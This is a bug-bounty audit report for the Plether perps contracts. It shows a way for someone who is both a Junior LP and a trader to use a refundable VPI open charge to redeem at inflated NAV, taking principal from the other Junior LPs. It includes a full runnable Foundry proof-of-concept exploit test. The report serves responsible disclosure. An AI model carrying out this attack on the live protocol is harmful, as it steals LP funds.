# \#98069 [SC-Critical] Refundable VPI open charge inflates Junior NAV at redemption, letting an LP-trader take remaining Junior LPs' principal

**Submitted on Nov 4th 2026 at 19:33:38 UTC by @dxhod for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #98069
- **Report Type:** Smart Contract
- **Report severity:** Critical
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Brief/Intro

Plether books a positive VPI (price-impact) open charge into Junior LP NAV as permanent pool revenue, but refunds that same charge to the position as a close rebate paid out of pool cash when the position closes at unchanged skew. A single actor who is both a Junior LP and a trader can (1) queue a full Junior redemption, (2) open a heavy one-sided position to book the charge C into NAV, (3) permissionlessly settle the LP epoch so the redemption is priced at the inflated NAV - capturing the actor's share f*C - and (4) close the position to get C back from pool cash. The NAV bump the actor cashed out is funded by the Junior LPs who did not redeem. On the launch configuration this is a repeatable, fully permissionless transfer of principal from the remaining Junior LPs to the attacker.

## Vulnerability Details

**1. The open charge is booked as permanent LP revenue.** In `CfdEngineSettlementSidecar.executeOpen`, the trade cost (which includes the VPI charge), net of the protocol fee, is recorded as pool revenue:

```solidity
// src/CfdEngineSettlementSidecar.sol:454-463
if (delta.tradeCostAssets > 0) {
    uint256 poolCashInflowAssets = uint256(delta.tradeCostAssets) - protocolFeeCreditedAssets;
    if (poolCashInflowAssets > 0) {
        IHousePool(host.pool()).recordClaimantInflow(
            poolCashInflowAssets,
            IHousePool.ClaimantInflowKind.Revenue,
            IHousePool.ClaimantInflowCashMode.CashArrived
        );
    }
}
```

With Senior at its high-water mark, all pool revenue accrues to Junior.

**2. LP NAV does not discount the charge for being refundable.** `HousePoolAccountingLib.buildReconcileSnapshot` prices the single canonical LP snapshot (used for both LP entry and exit) as physicalAssets + terminalDelta - traderClaims, with no VPI term, so the freshly booked charge sits in NAV at full value:

```solidity
// src/libraries/HousePoolAccountingLib.sol:62-77
uint256 terminalAssets = engineSnapshot.physicalAssets;
uint256 terminalLiabilities = engineSnapshot.traderClaimBalanceAssets;
int256 terminalDelta = engineSnapshot.terminalLpPriceDeltaAssets;
if (terminalDelta >= 0) {
    terminalAssets += uint256(terminalDelta);
} else {
    // This form also handles `type(int256).min` without negating it directly.
    terminalLiabilities += uint256(-(terminalDelta + 1)) + 1;
}

if (terminalAssets >= terminalLiabilities) {
    snapshot.distributable = terminalAssets - terminalLiabilities;
} else {
    snapshot.deficit = terminalLiabilities - terminalAssets;
}
```

`physicalAssets` already contains the booked VPI charge; nothing in the snapshot discounts it for being refundable to the position that paid it.

The redemption is priced at settlement, not at request time (SECURITY.md: "a request does not lock a price, rate, or fee"), so the actor can request the redemption, then inflate NAV, then settle.

**3. On close at unchanged skew the charge is returned from pool cash.** `CloseAccountingLib.buildCloseState` clamps lifetime VPI only at zero; it still refunds the positive accrual:

```solidity
// src/libraries/CloseAccountingLib.sol:103-118
state.proportionalAccrualAssets = (position.vpiAccrued * sizeDelta) / position.size;   // = +C on a full close
if (poolDepthAssets != 0) {
    state.vpiDeltaAssets = CfdMath.calculateVPI(preSkew, postSkew, poolDepthAssets, vpiFactor); // rebate (negative)
}
if (state.proportionalAccrualAssets + state.vpiDeltaAssets < 0) {
    state.vpiDeltaAssets = -state.proportionalAccrualAssets;   // clamp => refund exactly C
}
```

The rebate is paid from free pool cash (`CfdEnginePlanLib._planCloseActionSettlement`, around :973-1061), i.e. from the remaining LPs.

**Why the existing protection does not catch it.** The repo's own `VpiDepth` tests confirm the clamp stops the *trader* from profiting on the open->close round trip (the trader pays C and gets at most C back). This finding does not profit on the trade; the trader side nets ~0. The profit is realized on the *LP* side: the actor captures f*C of the transient NAV bump by redeeming between the open and the close, and the later rebate is borne by the Junior LPs who stayed. This LP-redemption cross-subsidy is a different path from the trader round trip that the clamp and the documented negative-VPI reserve address.

**Full attack (one actor; every step permissionless - keepers are untrusted per the program):**
1. Deposit into Junior to reach a Junior share f > 0.4 (Junior deposits are uncapped: `TrancheVault.maxRequestDeposit` returns max for the non-senior vault).
2. After the 1h cooldown, `requestRedeem` the full Junior stake.
3. `commitOrder`/`executeOrder` a heavy one-sided open from ~zero skew -> charge C booked into Junior NAV.
4. `OrderRouter.settleLpEpoch(bytes[])` (permissionless) -> the redemption is funded at NAV+C; `claimRedeem` -> the actor receives f*(J+C).
5. `commitOrder`/`executeOrder` to close the position at unchanged skew -> the clamp refunds C from pool cash.

Net: actor +f*C - fees; remaining Junior -f*C + retained close fee. Cash is conserved; the remaining Junior LPs are the funding source.

## Impact Details

Direct theft of other Junior LPs' principal: the attacker's own redemption is priced above the pool's permanent value, and the shortfall is realized by the Junior LPs who did not redeem. Before the cycle the victim's stake is worth V; after it, V - f*C + (retained close fee). This is a loss of deposited principal, not of unclaimed yield.

**Measured** with the runnable Foundry PoC below at the release parameters (vpiFactor 0.01e18, maxSkew 0.4, maint 10 bps / init 20 bps, execution fee 4 bps, Senior cap 40M / maxSeniorShareBps 8000), on a Senior 8,000,000 / Junior 9,000,000 USDG pool (attacker f = 6/9 ~ 0.667), one 6,600,000-USDG-notional LONG, single cycle, every attacker step through public entry points:

- VPI charge booked into Junior NAV: 12,810.26 USDG
- Attacker net: +3,147.30 USDG
- Remaining Junior LP net: -5,907.16 USDG
- Treasury (open fee): +2,640.00 USDG
- Control run (identical setup, no position opened): attacker -97.43, victim -24.35 (redemption rounding only)

**Constraints and scaling (derived from the formulas, not separately measured):**

- Per cycle the charge is C = 0.5 * vpiFactor * x^2 / depth for a notional x opened from zero skew; with the 0.4 skew cap, C is at most ~0.0008 * depth. The attacker captures f*C and pays the open/close execution fees, so the cycle is profitable when f * C / x exceeds the fees, i.e. roughly f > 0.4 at zero pre-existing skew. Same-direction skew already opened by other traders raises C for the same x and lowers this threshold.
- Of the measured victim loss, 2,640 USDG (~45%) is the open fee credited to the treasury; the rest is the attacker's profit (plus ~120 USDG of rounding that stays with the seed/Senior side).
- The cycle is repeatable every ~2-3 hours (deposit epoch + 1 h deposit cooldown + redemption epoch). The position is held only for the seconds between open and close, so its FX exposure is ~zero-mean.
- Junior deposits are uncapped (`TrancheVault.maxRequestDeposit` returns `type(uint256).max` for the Junior vault), so the required Junior share is reachable; the Junior covenant guarantees that non-redeeming Junior holders always remain to fund the transfer.
- Capital: per the program's feasibility rules ("Attack Investment Amount"), a high capital requirement is generally not a valid reason to downgrade; the attacker's capital is returned with profit at the end of each cycle.

## References

- `packages/perps/src/CfdEngineSettlementSidecar.sol:454-463` (open charge -> pool revenue), commit a82d4fefb02768e5b3bddcc97dee371eee24fea8
- `packages/perps/src/libraries/HousePoolAccountingLib.sol:60-78` (LP NAV with no VPI deduction)
- `packages/perps/src/libraries/CloseAccountingLib.sol:103-118` (lifetime clamp refunds the accrued charge)
- `packages/perps/src/libraries/CfdEnginePlanLib.sol:973-1061` (close rebate paid from pool cash)
- `packages/perps/src/OrderRouter.sol:474-484` (permissionless `settleLpEpoch`)
- `packages/perps/src/HousePool.sol` (LP epoch settlement / redemption pricing); `packages/perps/src/TrancheVault.sol` (async request/claim redeem)

## Proof of Concept

## Proof of Concept

A self-contained Foundry test against the competition commit (a82d4fefb02768e5b3bddcc97dee371eee24fea8), using the repo's own `BasePerpTest` harness with the release parameters. Only USDG and Pyth are mocked (the allowed mocks).

Every attacker step is a call from the attacker's own address to a public entry point:
- opening and closing the position: the production V3 `OrderRouter.commitOrder(OrderV3Types.OrderRequest)` followed by `OrderRouter.executeOrder` (the attacker acts as its own keeper);
- Junior redemption: `TrancheVault.requestRedeem` / `claimRedeem` (async ERC-7540 path);
- LP epoch settlement while the position is open: the permissionless `OrderRouter.settleLpEpoch(bytes[])` (atomic oracle refresh + settlement).

Pool setup (honest Senior/Junior LP deposits before any position exists) uses the harness helpers `_fundJunior` / `_fundSenior`, and the release Senior covenant (40M / 80%) is applied through the owner's timelocked pool config.

### Steps to reproduce
1. Set the release params (vpiFactor 0.01e18, maxSkew 0.4, maint 10 / init 20 bps, execution fee 4 bps, Senior cap 40M, maxSeniorShareBps 8000).
2. Fund Junior: victim 3,000,000 USDG, attacker 6,000,000 USDG (attacker owns 6/9 of Junior). Fund Senior 8,000,000 USDG. Pool depth ~17,002,000 USDG.
3. After the 1 h deposit cooldown, the attacker `requestRedeem`s its full Junior stake.
4. The attacker commits and executes a 6,600,000-notional LONG from ~zero skew -> the VPI charge (12,810.26 USDG) is booked into Junior NAV (NAV per 1e6 shares 999 -> 1000).
5. At the epoch boundary the attacker calls `OrderRouter.settleLpEpoch(bytes[])` while the position is open -> the redemption is funded at the inflated NAV; the attacker `claimRedeem`s 6,008,441.79 USDG.
6. The attacker commits and executes the close of the LONG at unchanged skew -> the lifetime clamp refunds the charge from pool cash.
7. Assert attacker net profit > 0 and a remaining-Junior loss far above the control baseline.

### Result (2/2 pass)
- Attacker net: +3,147.30 USDG
- Remaining Junior LP net: -5,907.16 USDG
- Treasury (open fee): +2,640.00 USDG
- Control (same setup, no position): attacker -97.43, victim -24.35 (redemption rounding only)

### Command
```
forge build --root packages/perps
forge test --root packages/perps --match-path test/sca/H01.t.sol -vv
```

Place the file below at `packages/perps/test/sca/H01.t.sol` in a checkout of the competition repo at commit a82d4fe (with submodules), then run the commands above.

### Test file: `packages/perps/test/sca/H01.t.sol`
```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../perps/BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderRouter} from "@plether/perps/OrderRouter.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {console2} from "forge-std/console2.sol";

/// @title H01 — Self-refundable VPI open charge inflates Junior NAV at the actor's own redemption
/// @notice A positive VPI open charge is booked immediately into Junior LP NAV as pool
///         revenue (CfdEngineSettlementSidecar.executeOpen -> recordClaimantInflow(Revenue, CashArrived)), but the
///         same position recovers it as a close rebate at unchanged skew (CloseAccountingLib lifetime clamp only
///         floors lifetime VPI at 0; it still refunds the positive accrual). An actor who is BOTH a Junior LP and
///         the trader redeems its Junior stake at the transiently inflated NAV, capturing its share of the charge,
///         then closes the position to get the charge back. The transient NAV bump is paid for by the remaining
///         Junior holders. The repo's existing VpiDepth tests only check that the TRADER's round trip is not
///         profitable (clamp works); they do not check the cross-subsidy to a redeeming LP, which is this bug.
///
/// Release parameters (packages/perps/DEPLOYMENT.md and the program page): vpiFactor 0.01e18, maxSkewRatio 0.4, maint 10 bps, init 20 bps,
/// execution fee 4 bps, maxSeniorShareBps 8000. Oracle/USDG are the allowed mocks.
contract H01Test is BasePerpTest {

    uint256 internal clientNonce;

    address internal constant SENIOR_LP = address(0x5E01);
    address internal constant VICTIM_JUNIOR = address(0xB0B0); // remaining Junior holder
    address internal constant ACTOR = address(0xA77ac); // Junior LP + trader (same person)

    uint256 internal constant SENIOR_ASSETS = 8_000_000e6;
    uint256 internal constant VICTIM_JUNIOR_ASSETS = 3_000_000e6;
    uint256 internal constant ACTOR_JUNIOR_ASSETS = 6_000_000e6; // -> actor owns 6/9 = 0.667 of Junior
    uint256 internal constant ACTOR_DEPOSIT = 300_000e6; // clearinghouse deposit; excess returns on close
    uint256 internal constant OPEN_MARGIN = 50_000e6; // position margin (>> 20 bps init on 6.6M notional = 13.2k)

    // Heavy one-sided open: notional ~ 0.388 * pool depth (just under the 0.4 skew cap at D' = 17M).
    uint256 internal constant OPEN_SIZE = 6_600_000e18; // notional = size * price(1.0) = 6.6M USDG

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1 * 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function _initialSeniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    // ---- helpers ----------------------------------------------------------

    function _refreshMark() internal {
        vm.warp(vm.getBlockTimestamp() + 1);
        vm.roll(vm.getBlockNumber() + 1);
        bytes[] memory data = new bytes[](1);
        data[0] = abi.encode(uint256(1e8));
        router.updateMarkPrice(data);
    }

    /// @dev Production V3 commit surface (`OrderRouter.commitOrder(OrderV3Types.OrderRequest)`), caller = ACTOR.
    ///      Bounds are left wide so they never bind; the attack does not depend on them.
    function _actorCommit(
        CfdTypes.Side side,
        uint256 size,
        uint256 margin,
        bool isClose
    ) internal returns (uint64 orderId) {
        uint256 window = router.maxExecutionWindowSeconds();
        OrderV3Types.OrderRequest memory request = OrderV3Types.OrderRequest({
            clientOrderId: keccak256(abi.encode("H01", ++clientNonce)),
            side: side,
            sizeDelta: size,
            marginDelta: margin,
            targetPrice: (side == CfdTypes.Side.LONG) == isClose ? type(uint256).max : 1,
            isClose: isClose,
            bounds: OrderV3Types.ExecutionBounds({
                submitBy: uint64(vm.getBlockTimestamp() + window),
                executionWindowSeconds: uint32(window),
                allowedExecutionModes: 7,
                expectedConfigHash: router.lifecycleBook().currentExecutionConfigHash(),
                maxExecutionBountyAssets: type(uint256).max,
                maxExecutionNotionalAssets: type(uint256).max,
                maxGrossAccountDebitAssets: type(uint256).max,
                maxActionChargeAssets: type(uint256).max,
                maxExplicitFeesAssets: type(uint256).max,
                maxPostPositionSize: type(uint256).max,
                minPostSettlementBalanceAssets: 0,
                minPostPositionEquityAssets: 0,
                maxPostLeverageBps: type(uint32).max
            })
        });
        vm.prank(ACTOR);
        orderId = OrderRouter(payable(address(router))).commitOrder(request);
    }

    function _actorOpenLong() internal {
        uint64 id = _actorCommit(CfdTypes.Side.LONG, OPEN_SIZE, OPEN_MARGIN, false);
        bytes[] memory data = _mockPythUpdateData();
        vm.prank(ACTOR); // actor self-keeps -> recovers the execution bounty
        router.executeOrder(id, data);
    }

    function _actorCloseLong() internal {
        uint64 id = _actorCommit(CfdTypes.Side.LONG, OPEN_SIZE, 0, true);
        bytes[] memory data = _mockPythUpdateData();
        vm.warp(vm.getBlockTimestamp() + 1);
        vm.roll(vm.getBlockNumber() + 1);
        vm.prank(ACTOR);
        router.executeOrder(id, data);
    }

    function _actorRequestFullRedeem() internal returns (uint256 requestId) {
        uint256 shares = juniorVault.maxRequestRedeem(ACTOR);
        require(shares > 0, "actor has no redeemable shares");
        vm.prank(ACTOR);
        requestId = juniorVault.requestRedeem(shares, ACTOR, ACTOR);
    }

    /// @dev The actor settles the matured LP epoch itself through the public, permissionless
    ///      `OrderRouter.settleLpEpoch(bytes[])` (atomic mark refresh + settlement). No privileged prank.
    function _settleEpoch(uint256 requestId) internal {
        vm.warp(pool.lpEpochStart(requestId));
        bytes[] memory data = _mockPythUpdateData(); // fresh post-boundary basket at the same price
        vm.deal(ACTOR, 1 ether);
        vm.prank(ACTOR);
        router.settleLpEpoch{value: 1}(data);
    }

    function _actorClaimRedeem(uint256 requestId) internal returns (uint256 assets) {
        uint256 claimable = juniorVault.claimableRedeemRequest(requestId, ACTOR);
        if (claimable == 0) {
            return 0;
        }
        vm.prank(ACTOR);
        assets = juniorVault.claimRedeem(requestId, claimable, ACTOR, ACTOR);
    }

    /// @dev External value an address controls = wallet + free clearinghouse balance + redeemable value of held Junior shares.
    function _actorExternalValue(address who) internal view returns (uint256) {
        uint256 shares = juniorVault.balanceOf(who);
        uint256 shareValue = shares == 0 ? 0 : juniorVault.estimateRedeemAssets(shares);
        return settlementToken.balanceOf(who) + clearinghouse.balanceAssets(who) + shareValue;
    }

    function _victimRedeemableValue() internal view returns (uint256) {
        uint256 shares = juniorVault.balanceOf(VICTIM_JUNIOR);
        return shares == 0 ? 0 : juniorVault.estimateRedeemAssets(shares);
    }

    function _setupPool() internal {
        // Apply the release senior covenant (cap 40M, share 80%); the harness default is 9999 (more permissive).
        _setSeniorCapacity(40_000_000e6, 8000);
        _refreshMark();

        // Junior must exist before Senior: Senior capacity is bounded by the junior backing (80% share cap).
        _fundJunior(VICTIM_JUNIOR, VICTIM_JUNIOR_ASSETS);
        _fundJunior(ACTOR, ACTOR_JUNIOR_ASSETS);
        _fundSenior(SENIOR_LP, SENIOR_ASSETS);

        // Clear the 1h deposit cooldown so the actor may request a redemption.
        vm.warp(vm.getBlockTimestamp() + 1 hours + 1);
        _refreshMark();
    }

    // ---- the exploit ------------------------------------------------------

    function test_H01_exploit_stealsFromRemainingJunior() public {
        _setupPool();

        // Actor's total committed capital: Junior deposit + trading margin.
        settlementToken.mint(ACTOR, ACTOR_DEPOSIT);
        vm.startPrank(ACTOR);
        settlementToken.approve(address(clearinghouse), ACTOR_DEPOSIT);
        clearinghouse.deposit(ACTOR, ACTOR_DEPOSIT);
        vm.stopPrank();
        uint256 actorCommitted = ACTOR_JUNIOR_ASSETS + ACTOR_DEPOSIT;

        uint256 victimBefore = _victimRedeemableValue();
        uint256 treasuryBefore = clearinghouse.balanceAssets(PROTOCOL_TREASURY_ACCOUNT);
        uint256 navPerShareBefore = juniorVault.estimateRedeemAssets(1e6);

        // 1) Queue the full Junior redemption.
        uint256 requestId = _actorRequestFullRedeem();

        // 2) Open a heavy one-sided position from ~zero skew -> VPI charge booked into Junior NAV as revenue.
        uint256 poolDepthAtOpen = pool.totalAssets();
        _actorOpenLong();
        uint256 navPerShareAfterOpen = juniorVault.estimateRedeemAssets(1e6);
        uint256 revenueBooked = pool.totalAssets() - poolDepthAtOpen; // VPI charge that reached the pool (net of protocol fee)

        // 3) Settle the LP epoch while the position is open -> actor redemption priced at the inflated NAV.
        _settleEpoch(requestId);

        // 4) Claim the redemption.
        uint256 redeemed = _actorClaimRedeem(requestId);

        // 5) Close the position at unchanged skew -> lifetime clamp refunds the charge from pool cash.
        _actorCloseLong();

        // ---- measure ----
        uint256 actorFinal = _actorExternalValue(ACTOR);
        int256 actorNet = int256(actorFinal) - int256(actorCommitted);
        uint256 victimAfter = _victimRedeemableValue();
        int256 victimNet = int256(victimAfter) - int256(victimBefore);
        uint256 treasuryAfter = clearinghouse.balanceAssets(PROTOCOL_TREASURY_ACCOUNT);
        int256 treasuryNet = int256(treasuryAfter) - int256(treasuryBefore);

        console2.log("--- H01: self-refundable VPI charge, release params ---");
        console2.log("pool depth at open (USDG)       :", poolDepthAtOpen / 1e6);
        console2.log("VPI revenue booked into pool     :", revenueBooked);
        console2.log("Junior NAV / 1e6 shares before   :", navPerShareBefore);
        console2.log("Junior NAV / 1e6 shares at open  :", navPerShareAfterOpen);
        console2.log("actor committed (deposit+margin) :", actorCommitted);
        console2.log("actor redeemed proceeds          :", redeemed);
        console2.log("actor final external value       :", actorFinal);
        console2.log("actor NET (profit if > 0)        :", actorNet);
        console2.log("victim redeemable before         :", victimBefore);
        console2.log("victim redeemable after          :", victimAfter);
        console2.log("victim NET (loss if < 0)         :", victimNet);
        console2.log("treasury NET (open fee)          :", treasuryNet);
        console2.log("conservation (actor+victim+treas):", actorNet + victimNet + treasuryNet);

        // The charge really reached Junior NAV and lifted the per-share price before the actor redeemed.
        assertGt(revenueBooked, 0, "VPI open charge must be booked as pool revenue");
        assertGt(navPerShareAfterOpen, navPerShareBefore, "Junior NAV per share must rise on the open charge");

        // Core claim: the actor extracts value and the remaining Junior holder loses it.
        // The control run (test_H01_control) shows the redemption-rounding floor is only ~24 USDG; here the loss is
        // orders of magnitude larger, driven by the self-refundable VPI charge.
        assertGt(actorNet, 0, "actor must net a profit from the VPI-NAV round trip");
        assertLt(victimNet, 0, "remaining Junior holder must lose value");
        assertGt(victimBefore - victimAfter, 1_000e6, "victim loss must dwarf the redemption-rounding baseline");
    }

    // ---- control: same actor cycle WITHOUT the position (no VPI charge) ----

    function test_H01_control_noPosition_noTheft() public {
        _setupPool();

        uint256 actorCommitted = ACTOR_JUNIOR_ASSETS;
        uint256 victimBefore = _victimRedeemableValue();

        uint256 requestId = _actorRequestFullRedeem();
        _settleEpoch(requestId);
        uint256 redeemed = _actorClaimRedeem(requestId);

        uint256 actorFinal = _actorExternalValue(ACTOR);
        int256 actorNet = int256(actorFinal) - int256(actorCommitted);
        uint256 victimAfter = _victimRedeemableValue();

        console2.log("--- H01 control: no position opened ---");
        console2.log("actor redeemed proceeds   :", redeemed);
        console2.log("actor NET                 :", actorNet);
        console2.log("victim redeemable before  :", victimBefore);
        console2.log("victim redeemable after   :", victimAfter);

        // Without the trade, the actor cannot profit and the victim keeps essentially its full value
        // (only redemption-rounding dust moves, ~24 USDG on a 3M stake).
        assertLe(actorNet, 0, "control: no profit without the VPI round trip");
        assertLt(victimBefore - victimAfter, 100e6, "control: victim loses only redemption-rounding dust");
    }

}
```

